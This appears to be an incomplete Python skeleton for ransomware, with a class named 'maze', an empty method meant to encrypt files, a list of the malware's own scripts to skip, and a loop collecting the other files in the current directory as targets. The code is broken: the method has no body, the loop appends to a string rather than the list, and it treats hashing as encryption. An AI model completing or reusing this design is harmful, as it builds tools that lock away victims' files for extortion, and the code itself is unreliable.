import os
import sys
import logging


# Ransomware class

class maze:

    # Encrypt files using our own Hashing algorithm
    def encrypt_file(filename):




malware_files = ["maze.py", "encrypt.py", "decrypt.py"]
files = []

for file in os.listdir():
    if file in malware_files:
        continue

    # only files and no directories

    if os.path.isfile(file):
        file.append(file)   
